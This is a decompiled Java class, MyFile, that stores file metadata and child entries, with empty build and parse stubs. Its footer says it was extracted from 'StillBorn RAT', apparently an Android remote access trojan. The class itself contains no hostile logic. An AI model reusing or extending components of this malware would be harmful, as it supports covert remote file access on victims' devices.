/*   1:    */ package utils;
/*   2:    */ 
/*   3:    */ import java.io.File;
/*   4:    */ import java.io.Serializable;
/*   5:    */ import java.util.ArrayList;
/*   6:    */ 
/*   7:    */ public class MyFile
/*   8:    */   implements Serializable
/*   9:    */ {
/*  10:    */   private static final long serialVersionUID = -8076326593527941165L;
/*  11: 28 */   public boolean isFile = false;
/*  12: 29 */   public boolean isDir = true;
/*  13: 30 */   public long lastModif = 0L;
/*  14: 31 */   public long length = 0L;
/*  15:    */   public String name;
/*  16:    */   public boolean r;
/*  17:    */   public boolean w;
/*  18:    */   public boolean hidden;
/*  19:    */   public String path;
/*  20:    */   public ArrayList<MyFile> list;
/*  21:    */   
/*  22:    */   public MyFile(File f)
/*  23:    */   {
/*  24: 43 */     this.name = f.getName();
/*  25: 44 */     this.length = f.length();
/*  26: 45 */     this.lastModif = f.lastModified();
/*  27: 46 */     this.isFile = f.isFile();
/*  28: 47 */     this.isDir = f.isDirectory();
/*  29: 48 */     this.r = f.canRead();
/*  30: 49 */     this.w = f.canWrite();
/*  31:    */     
/*  32: 51 */     this.hidden = f.isHidden();
/*  33: 52 */     this.path = f.getPath();
/*  34:    */     
/*  35: 54 */     this.list = new ArrayList();
/*  36:    */   }
/*  37:    */   
/*  38:    */   public ArrayList<MyFile> getList()
/*  39:    */   {
/*  40: 58 */     return this.list;
/*  41:    */   }
/*  42:    */   
/*  43:    */   public void addChild(MyFile c)
/*  44:    */   {
/*  45: 62 */     this.list.add(c);
/*  46:    */   }
/*  47:    */   
/*  48:    */   public boolean isFile()
/*  49:    */   {
/*  50: 66 */     return this.isFile;
/*  51:    */   }
/*  52:    */   
/*  53:    */   public void setFile(boolean isFile)
/*  54:    */   {
/*  55: 70 */     this.isFile = isFile;
/*  56:    */   }
/*  57:    */   
/*  58:    */   public boolean isDir()
/*  59:    */   {
/*  60: 74 */     return this.isDir;
/*  61:    */   }
/*  62:    */   
/*  63:    */   public void setDir(boolean isDir)
/*  64:    */   {
/*  65: 78 */     this.isDir = isDir;
/*  66:    */   }
/*  67:    */   
/*  68:    */   public long getLastModif()
/*  69:    */   {
/*  70: 82 */     return this.lastModif;
/*  71:    */   }
/*  72:    */   
/*  73:    */   public void setLastModif(long lastModif)
/*  74:    */   {
/*  75: 86 */     this.lastModif = lastModif;
/*  76:    */   }
/*  77:    */   
/*  78:    */   public long getLength()
/*  79:    */   {
/*  80: 90 */     return this.length;
/*  81:    */   }
/*  82:    */   
/*  83:    */   public void setLength(long length)
/*  84:    */   {
/*  85: 94 */     this.length = length;
/*  86:    */   }
/*  87:    */   
/*  88:    */   public String getName()
/*  89:    */   {
/*  90: 98 */     return this.name;
/*  91:    */   }
/*  92:    */   
/*  93:    */   public void setName(String name)
/*  94:    */   {
/*  95:102 */     this.name = name;
/*  96:    */   }
/*  97:    */   
/*  98:    */   public boolean isR()
/*  99:    */   {
/* 100:106 */     return this.r;
/* 101:    */   }
/* 102:    */   
/* 103:    */   public void setR(boolean r)
/* 104:    */   {
/* 105:110 */     this.r = r;
/* 106:    */   }
/* 107:    */   
/* 108:    */   public boolean isW()
/* 109:    */   {
/* 110:114 */     return this.w;
/* 111:    */   }
/* 112:    */   
/* 113:    */   public void setW(boolean w)
/* 114:    */   {
/* 115:118 */     this.w = w;
/* 116:    */   }
/* 117:    */   
/* 118:    */   public boolean isHidden()
/* 119:    */   {
/* 120:122 */     return this.hidden;
/* 121:    */   }
/* 122:    */   
/* 123:    */   public void setHidden(boolean hidden)
/* 124:    */   {
/* 125:126 */     this.hidden = hidden;
/* 126:    */   }
/* 127:    */   
/* 128:    */   public String getPath()
/* 129:    */   {
/* 130:130 */     return this.path;
/* 131:    */   }
/* 132:    */   
/* 133:    */   public void setPath(String path)
/* 134:    */   {
/* 135:134 */     this.path = path;
/* 136:    */   }
/* 137:    */   
/* 138:    */   public byte[] build()
/* 139:    */   {
/* 140:143 */     return null;
/* 141:    */   }
/* 142:    */   
/* 143:    */   public void parse(byte[] packet) {}
/* 144:    */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     utils.MyFile
 * JD-Core Version:    0.7.0.1
 */